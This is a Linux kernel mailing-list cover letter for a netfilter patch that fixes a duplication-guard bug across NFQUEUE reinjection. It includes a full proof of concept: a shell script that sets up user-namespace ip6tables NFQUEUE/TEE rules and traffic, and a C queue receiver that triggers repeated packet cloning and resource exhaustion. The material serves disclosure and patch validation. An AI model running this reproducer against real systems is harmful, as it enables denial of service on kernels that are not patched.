Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 155373BF692
	for <netfilter-devel@vger.kernel.org>; Sun, 11 Oct 2026 11:31:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791718295; cv=none; b=rd9T2llFugXzZsym51KCoZYKgSyztThYgmkrHhv5sOxfxu7HzFuq/QWKHcN/zwamxxd35uPqN2t6A2ljZBdmP2YFHIK9LNlTvMGPZbD6Ei0s0otceJT0wfZnbNMQNbRsH8YcHhUB+VKjv4QQqnBwQVctYAuG7WNvPSywllH88VA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791718295; c=relaxed/simple;
	bh=O1fRcjXOxYTqG4a/SH55rUhQaCfB8vgeO6i5+3ed0ZY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=R+u44xuieot/ovKlrtLtQ1Svusm9WBoDyLaEnwlvehKOHZ3vWE1c0NXMth1ChSEzFy5eEO6lUkadLISliqor6Czm2Sjp/+N6vDctb607rbYtAY8TwmngdDHvCuOF+6dLcuUOc55S1t4X9WfgfcwKjKR/jfPYAHQ2QkCoGyQzvOw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XuHHG5F9; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XuHHG5F9"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-3ab450c0873so977557a91.3
        for <netfilter-devel@vger.kernel.org>; Sun, 11 Oct 2026 04:31:31 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791718291; x=1792323091; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=rfQFgIRH/O/pvNitY515Y1RjgcN/Ow6mnBT4WiGVvg4=;
        b=XuHHG5F9YP3Bc6uRAO9y7znBTCOs8XFEPYCKPdFQfhKqiIIvyMTrOIf9ptSjQLoKxx
         pOYM7nL/3GzP7KbxTTPOnVRs5B/pmwqKJ9IThV5e5RvvSoz4Dn2zdDyLyrgyzYln9GeO
         rwvd3O33qinDsm8izAx/iXQF+fYA1YlrOEVh9cL2H7Ui2CwjlAkbQiYJydBT/E4lY7V8
         2L8e5habXynlYdw9Zc8Ycz7kKCqcy3nAF2B6XmPkO/P4pxsS+gMqaD71L7Q97TuLpaP8
         u0P8eWUlgDM8tyamuEU6qGsnHb1+P3lRY3OpiBIqfDNkS7o0kGyukhZcZDU7chSxMUPe
         U7VA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791718291; x=1792323091;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=rfQFgIRH/O/pvNitY515Y1RjgcN/Ow6mnBT4WiGVvg4=;
        b=R5K/W4NZir71bx3HZV1JthAjLhAJot82NOrxAIqLaFw+hRZCtOIm4WISTclpxnpNGi
         /U1tYINmzKjuyDmRVaDnqk7W30SRNP8KZ4vWwqsHg4A9RYmipsjSCeA5vBCWaKFi4F6k
         U2AqOGULme1FQG7v2JfLZ8y+ukJ0POZese7kfnb6/6NQB2j59ncfb2+0Ej7tyOm6u+oS
         AmH9Ds3kopCQbCirRe3GJRxHDc4Lf82cfrpvlpfyp277yI8kkzqqbKZ/3Y5jI2rcjpAr
         HlJWc8y1i8CXsnzRMOHZmZ61MAd9dVxa3AtFkhaaWgEpxvIPEvpAMg63SSo5VwXNy7Z/
         13bw==
X-Forwarded-Encrypted: i=1; AKwUvBzfQK4sGm7te84P1jQxRKpUcLq9Dec151jSZKL+PiypIo85UgwkznfTdQH91AanVa6L9Kgcl+ivt6zpiWro+No=@vger.kernel.org
X-Gm-Message-State: AFq9FYJo7EwKht1/suiQghN43kOKI7Keb5AERb81jtEoulMHbkJkZXyF
	fNprVJm64Iu1CSJYRuAy7Ymca2v6yYPIp9JL3vlErfF504NOySynx6kJ9iGIapShJ+Lp
X-Gm-Gg: AYBFou3Le5gH3r/JyyquRlEcPgJUHLYNY9/Vn/HJKxAz/SH42hVWjl9J4B12Rfz+6Ms
	7GQgaYNUMnhE7Xevl3iIDHaC2X82/Lo+jIjfeMRz4bZ8tmXCfTxS1Kcucltp4S4/9ZJ2P2F/yLL
	kPApAaDAMSIk9dSFWT52pJCWWOY0OPh1bD6y9mxfK+zC1FVF+9jgdekyycbbjOOMt4qja7xcjr9
	XrPZDgqQZtSgiX/uQZ035FvLsiaaOPCCzY8EvkPFoPiOkUWZRvPxxJwNJ5M0MTKqJbdEWSF0oSS
	bPm9ws1JrBpatuTiCMJBSfcP0tCbdzLPBYer31ZvyQEOsF9dkWw624PBdaU6B/FQX0XJ4fJSOf7
	mFDPEXQVggihaLkhInCl2VzNsbVMbNf3Xlw5BMaybcUoiEIzE2gYtx3x7NER+2FhLsO+ScX8Zn1
	QwEGOW4oOeQYk8OKixaiVHhWjCv8DT+qDgR3aglVHIE8E+ex0ddSgVwqN3KGGBclyMJd1vCCJ/K
	8yu9SqosO+f5tZuFcB8qx4L9ZsSvQ==
X-Received: by 2002:a17:90b:1dc1:b0:3a8:96cb:fe8 with SMTP id 98e67ed59e1d1-3ab3a2fe583mr5831826a91.9.1791718290851;
        Sun, 11 Oct 2026 04:31:30 -0700 (PDT)
Received: from 759f62e3e206.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ab38b9639bsm11417577a91.4.2026.10.11.04.31.23
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 11 Oct 2026 04:31:29 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-kernel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: mingo@redhat.com,
	peterz@infradead.org,
	juri.lelli@redhat.com,
	vincent.guittot@linaro.org,
	dietmar.eggemann@arm.com,
	rostedt@goodmis.org,
	bsegall@google.com,
	mgorman@suse.de,
	vschneid@redhat.com,
	kprateek.nayak@amd.com,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	jengelh@medozas.de,
	lukas@wunner.de,
	vega@nebusec.ai,
	root@tr0jan.top,
	zihanx@nebusec.ai
Subject: [PATCH nf v7 0/1] netfilter: nf_dup: preserve duplication guard across NFQUEUE
Date: Sun, 11 Oct 2026 11:28:43 +0000
Message-ID: <cover.1791688819.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and reproduced an asynchronous packet-duplication issue in
net/ipv6/netfilter/nf_dup_ipv6.c. A duplicate can be retained by NFQUEUE and
resume hook traversal after the task-local duplication guard has been cleared.
A later duplication rule can then clone it again, causing repeated packet
processing and resource consumption. The trigger is reachable to a non-root
user when unprivileged user and network namespaces are enabled and the user
has CAP_NET_ADMIN in the child network namespace.

This v7 replaces the v6 rule-setup restriction with state propagation through
nf_queue_entry. During reinjection, a separate task-local flag marks the
queued packet's duplication state. Duplication guards consult that flag only
in task context, so pending softirqs run by local_bh_enable() do not inherit
the verdict task's reinjection state. The netdev dup marker is scoped to the
BH-disabled transmit section. The change covers NFQUEUE continuations of
IPv4/IPv6 and nft_dup_netdev duplication, but not an independent device
receive path such as a veth peer ingress return. No memory-safety or
privilege-escalation impact is claimed.

The change is limited to duplication-guard handling for packets resumed
through NFQUEUE. It should not affect other functionality: ordinary
NFQUEUE traffic and duplication paths that do not use NFQUEUE retain
their existing behavior.

On the unpatched nf.git baseline
ab699d296e066eb64f51d2a8a1d42237a3b186c8, a bounded unprivileged user-
namespace run with one NFQUEUE, one TEE clone and a one-byte payload
observed 152,322 NFQUEUE callbacks in 6.649 seconds. This includes the
stop-wakeup callback. The PoC increments its counter before calling
nfq_set_verdict() and does not check its return, so this is not a confirmed
count of successful verdict submissions. It demonstrated repeated queue
re-entry; no kernel panic, BUG or Oops was observed.

A separate test-only run used this baseline with the PoC defaults: 18 queues,
two TEE clones and a 60,000-byte payload. It omitted the five-second
shutdown/wakeup tail, keeping the rules active, and ran with a 120-second
cap. Guest root set global vm.panic_on_oom=1 before the unprivileged run.
No OOM panic, BUG or Oops was observed in the serial log before the runner
timeout. No crash log was produced on this baseline.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

nf_dup_ipv4() and nf_dup_ipv6() set current->in_nf_duplicate while the cloned
skb traverses output hooks. NFQUEUE can retain that skb and return
NF_STOLEN. The output call then unwinds and clears the task-local flag. When
userspace later returns NF_ACCEPT, nf_reinject() resumes hook traversal after
the queued hook in the verdict-processing task, where the flag is clear. A
later dup rule can therefore duplicate the same skb again.

The queue entry now records whether queuing happened while a duplication
output was active. nf_reinject() uses a separate task-local reinjection flag
for the resumed traversal and restores the verdict task's previous flag on
every exit. The flag is honored only in task context, since local_bh_enable()
may process pending softirqs before reinjection finishes. The netdev dup
frontend uses a separate synchronous xmit recursion counter; its marker is
set only in the BH-disabled transmit section so an NFQUEUE entry created for
the clone retains duplication state. The xmit recursion counter itself is
unchanged. This change addresses NFQUEUE reinjection only, not asynchronous
re-entry through an independent device receive path.

Fixes: cd58bcd9787e covers the TEE path where clones began traversing
local-output hooks. The netdev NFQUEUE path depends on the egress hook
first introduced by 8537f78647c0 and reverted by
357b6cc5834e; the active implementation was reintroduced by
42df6e1d221d. The Fixes tag points to the earliest introduction. Commit
502061f81d3e adds the netdev dup frontend but does not introduce the
egress-hook NFQUEUE continuation. The later IPv4/IPv6 nft dup frontend
uses the shared nf_dup helpers and does not introduce a separate guard
lifetime issue.

Reproducer:

packetdrill is not used because the essential interaction is an NFQUEUE
netlink verdict loop: a userspace consumer receives each queued skb and
returns NF_ACCEPT. Packetdrill's packet/syscall scripts do not model this
NFQUEUE netlink control-plane exchange; the PoC runs a libnetfilter_queue
consumer alongside rule setup and traffic generation.

The following command uses the local Makefile and poc.sh; poc.sh builds the
NFQUEUE receiver with -lnetfilter_queue and -lnfnetlink, installs the IPv6
NFQUEUE/TEE rules, sends traffic, and services verdicts. The values below
bound the unpatched-baseline run and override the script defaults. Guest
root set vm.panic_on_oom=0 before the unprivileged test; the run used one
queue, one TEE clone, and a one-byte payload.

    PANIC_ON_OOM=0 QUEUE_COUNT=1 TEE_CLONES=1 PAYLOAD=1 \
        BASE_PORT=5655 bash ./poc.sh --userns

The v7 patch source diff (9 files, 43 insertions, 6 deletions) was built
against nf.git baseline ab699d296e066eb64f51d2a8a1d42237a3b186c8 under
Ubuntu 24.04.4 LTS and booted in a 2 vCPU, 2 GB RAM x86 QEMU guest.
The bounded user-namespace run used one NFQUEUE, one TEE clone, and a
one-byte payload. After the five-second window, the script sends SIGTERM to
the receiver, installs an NFQUEUE-only raw OUTPUT rule for UDP port 5656
(BASE_PORT + QUEUE_COUNT), then sends a one-byte W datagram to
::1:5656 to wake queue 0.
The receiver reported callbacks=3: two for the trigger packet and its TEE
clone, plus one for the wake-up packet. This is a callback count, not a
confirmed successful-verdict count. No kernel panic, BUG, or Oops occurred.
This validates only the IPv6 ip6tables NFQUEUE/TEE path, not independent
netdev receive-path re-entry.

changes in v7:
  - sample the task-context reinjection flag before local_bh_disable()
    in both IPv4 and IPv6 duplication helpers
  - replace the v6 user-namespace setup restriction with NFQUEUE state
    capture and restoration
  - use a task-context-only reinjection flag to avoid pending softirqs
    inheriting the duplication guard
  - scope the netdev dup marker to the BH-disabled transmit section
  - cover queued IPv4/IPv6 duplication and nft_dup_netdev clones
  - point the netdev NFQUEUE Fixes tag to the earliest egress-hook
    introduction (8537f78647c0), not the current reintroduction
    (42df6e1d221d)
  - record the v7 build and bounded IPv6 NFQUEUE/TEE validation
  - state that independent device receive-path re-entry remains outside scope
  - v6 Link:
    https://lore.kernel.org/all/82abaa776053bb3e716095a783722452d87fa039.1791429178.git.zihanx@nebusec.ai/
changes in v6:
  - reroll the unchanged v5 patch on nf.git main at ab699d296e06
  - do not present v5 build or runtime results as v6 validation
  - v5 Link:
    https://lore.kernel.org/all/20260929125832.25316-1-zihanx@nebusec.ai/
changes in v5:
  - describe the patch as a non-initial-userns setup restriction, not a
    general recursion fix; state that init_user_ns behavior is unchanged
  - remove path-specific trigger details and run-specific metrics from the
    public commit and cover prose
  - drop d877f07112f1 from Fixes: because it added a later frontend, not the
    shared duplication behavior addressed by that restriction
  - v4 Link:
    https://lore.kernel.org/all/cover.1790408011.git.zihanx@nebusec.ai/
changes in v4:
  - add Fixes tags for TEE, IPv4/IPv6 nft dup, and netdev nft dup frontends
  - clarify that fcd53c51d037 only added a synchronous guard
  - clarify that the userns restriction left init_user_ns behavior unchanged
  - v3 Link:
    https://lore.kernel.org/all/cover.1790042930.git.zihanx@nebusec.ai/
changes in v3:
  - reroll against nf.git main after no follow-up on v2
  - add the Co-developed-by trailer and matching Signed-off-by
  - v2 Link:
    https://lore.kernel.org/all/cover.1788425393.git.zihanx@nebusec.ai/
changes in v2:
  - drop the persistent struct sk_buff::nf_duplicated field and nf_copy()
    change from v1
  - disable IPv4/IPv6 duplication in non-initial user namespaces
  - v1 Link:
    https://lore.kernel.org/all/cover.1787903722.git.zihanx@nebusec.ai/

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
LDLIBS ?= -lnetfilter_queue -lnfnetlink

all: poc

poc: poc.c

clean:
	rm -f poc
------END Makefile------

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
IP=/usr/sbin/ip
IP6TABLES=/usr/sbin/ip6tables-legacy
SYSCTL=/usr/sbin/sysctl
export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-$SCRIPT_DIR/xtables.lock}
QUEUE_COUNT=${QUEUE_COUNT:-18}
BASE_PORT=${BASE_PORT:-5555}
PAYLOAD=${PAYLOAD:-60000}
TEE_CLONES=${TEE_CLONES:-2}
PANIC_ON_OOM=${PANIC_ON_OOM:-1}
PANIC_ON_WARN=${PANIC_ON_WARN:-0}

if [[ ${1-} == "--userns" ]]; then
	exec unshare -Urn -- "$0" --inside-userns
fi

if [[ ${1-} == "--inside-userns" ]]; then
	shift
fi

cleanup() {
	"$IP6TABLES" -t raw -F OUTPUT 2>/dev/null || true
	"$IP6TABLES" -t mangle -F OUTPUT 2>/dev/null || true
	for pid in "${acceptor_pids[@]-}"; do
		kill "$pid" 2>/dev/null || true
	done
	for pid in "${acceptor_pids[@]-}"; do
		wait "$pid" 2>/dev/null || true
	done
}
trap cleanup EXIT

"$IP" link set lo up
"$SYSCTL" -q -w kernel.panic_on_warn="$PANIC_ON_WARN" || true
"$SYSCTL" -q -w vm.panic_on_oom="$PANIC_ON_OOM" || true
"$SYSCTL" -q -w net.core.rmem_max=536870912 || true
"$SYSCTL" -q -w net.core.rmem_default=536870912 || true
"$SYSCTL" -q -w net.netfilter.nf_queue_maxlen=65535 || true

make -C "$SCRIPT_DIR" clean all

"$IP6TABLES" -t raw -F OUTPUT
"$IP6TABLES" -t mangle -F OUTPUT

acceptor_pids=()

for q in $(seq 0 $((QUEUE_COUNT - 1))); do
	port=$((BASE_PORT + q))

	"$IP6TABLES" -t raw -A OUTPUT \
		-p udp -d ::1 --dport "$port" \
		-j NFQUEUE --queue-num "$q"

	for _ in $(seq 1 "$TEE_CLONES"); do
		"$IP6TABLES" -t mangle -A OUTPUT \
			-p udp -d ::1 --dport "$port" \
			-j TEE --gateway ::1 --oif lo
	done

	"$SCRIPT_DIR/poc" "$q" >"$SCRIPT_DIR/acceptor-$q.log" 2>&1 &
	acceptor_pids+=("$!")
done
sleep 1

python3 - "$BASE_PORT" "$QUEUE_COUNT" "$PAYLOAD" <<'PY'
import socket
import sys

base_port = int(sys.argv[1])
queue_count = int(sys.argv[2])
payload_len = int(sys.argv[3])

s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
for offset in range(queue_count):
	dport = base_port + offset
	s.sendto(b"A" * payload_len, ("::1", dport))
	print("sent", payload_len, "bytes to ::1", dport)
PY

echo "PoC is active. Queue state:"
cat /proc/net/netfilter/nfnetlink_queue 2>/dev/null || true

sleep 5
for pid in "${acceptor_pids[@]}"; do
	kill "$pid" 2>/dev/null || true
done
wake_port=$((BASE_PORT + QUEUE_COUNT))
"$IP6TABLES" -t raw -A OUTPUT -p udp -d ::1 --dport "$wake_port" -j NFQUEUE --queue-num 0
python3 - "$wake_port" <<'PY'
import socket
import sys

port = int(sys.argv[1])
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.sendto(b"W", ("::1", port))
print("sent stop-wakeup packet to ::1", port)
PY
for pid in "${acceptor_pids[@]}"; do
	wait "$pid" 2>/dev/null || true
done
cat "$SCRIPT_DIR/acceptor-0.log"
------END poc.sh------

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netfilter.h>
#include <linux/netlink.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static uint64_t packets_seen;
static uint64_t last_report;
static struct timespec start_ts;

static void on_signal(int signo)
{
	(void)signo;
	stop = 1;
}

static void report_progress(bool force)
{
	struct timespec now;
	double seconds;

	if (!force && packets_seen - last_report < 1000)
		return;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return;

	seconds = (now.tv_sec - start_ts.tv_sec) +
		  (now.tv_nsec - start_ts.tv_nsec) / 1000000000.0;
	fprintf(stderr, "callbacks=%llu elapsed=%.3f rate=%.0f pkt/s\n",
		(unsigned long long)packets_seen, seconds,
		seconds > 0.0 ? packets_seen / seconds : 0.0);
	last_report = packets_seen;
}

static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
		    struct nfq_data *nfa, void *data)
{
	struct nfqnl_msg_packet_hdr *ph;
	uint32_t id = 0;

	(void)nfmsg;
	(void)data;

	ph = nfq_get_msg_packet_hdr(nfa);
	if (ph)
		id = ntohl(ph->packet_id);

	packets_seen++;
	report_progress(false);

	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

int main(int argc, char **argv)
{
	struct nfq_handle *h = NULL;
	struct nfq_q_handle *qh = NULL;
	int fd;
	int queue_num = 0;
	int rv;
	int ret = 1;
	int one = 1;
	int rcvbuf = 512 * 1024 * 1024;
	unsigned int maxlen = 65535;
	char buf[8192] __attribute__((aligned));

	if (argc > 2) {
		fprintf(stderr, "usage: %s [queue-num]\n", argv[0]);
		return 2;
	}
	if (argc == 2)
		queue_num = atoi(argv[1]);

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
		perror("clock_gettime");
		return 1;
	}

	h = nfq_open();
	if (!h) {
		perror("nfq_open");
		goto out;
	}

	if (nfq_unbind_pf(h, AF_INET6) < 0)
		fprintf(stderr, "warning: nfq_unbind_pf(AF_INET6) failed\n");

	if (nfq_bind_pf(h, AF_INET6) < 0) {
		perror("nfq_bind_pf(AF_INET6)");
		goto out;
	}

	qh = nfq_create_queue(h, (uint16_t)queue_num, queue_cb, NULL);
	if (!qh) {
		perror("nfq_create_queue");
		goto out;
	}

	if (nfq_set_mode(qh, NFQNL_COPY_META, 0) < 0) {
		perror("nfq_set_mode");
		goto out;
	}

	if (nfq_set_queue_maxlen(qh, maxlen) < 0)
		fprintf(stderr, "warning: nfq_set_queue_maxlen(%u) failed\n", maxlen);

	fd = nfq_fd(h);
	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUFFORCE, &rcvbuf,
		       sizeof(rcvbuf)) < 0 &&
	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
		fprintf(stderr, "warning: socket receive buffer setup failed: %s\n",
			strerror(errno));
	if (setsockopt(fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &one, sizeof(one)) < 0)
		fprintf(stderr, "warning: NETLINK_NO_ENOBUFS failed: %s\n",
			strerror(errno));

	while (!stop) {
		rv = recv(fd, buf, sizeof(buf), 0);
		if (rv >= 0) {
			if (nfq_handle_packet(h, buf, rv) < 0) {
				perror("nfq_handle_packet");
				break;
			}
			continue;
		}

		if (errno == EINTR)
			continue;
		if (errno == ENOBUFS)
			continue;

		perror("recv");
		break;
	}

	report_progress(true);
	ret = 0;

out:
	if (qh)
		nfq_destroy_queue(qh);
	if (h)
		nfq_close(h);
	return ret;
}
------END poc.c--------

No decoded crash report was produced by the latest-baseline unpatched runs.

----BEGIN crash log----
NOT RUN: No KASAN report, kernel panic, BUG or Oops was produced by the
latest-baseline unpatched runs. The bounded run completed normally; the
extended run reached its 120-second runner timeout without a kernel failure.
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  netfilter: nf_dup: preserve duplication guard across NFQUEUE

 include/linux/sched.h            |  2 ++
 include/net/netfilter/nf_queue.h |  1 +
 net/ipv4/netfilter/ip_tables.c   |  5 ++++-
 net/ipv4/netfilter/nf_dup_ipv4.c |  5 ++++-
 net/ipv6/netfilter/ip6_tables.c  |  5 ++++-
 net/ipv6/netfilter/nf_dup_ipv6.c |  6 +++++-
 net/netfilter/nf_dup_netdev.c    | 13 ++++++++++++-
 net/netfilter/nf_queue.c         |  4 ++++
 net/netfilter/nfnetlink_queue.c  |  8 +++++++-
 9 files changed, 43 insertions(+), 6 deletions(-)

-- 
2.43.0

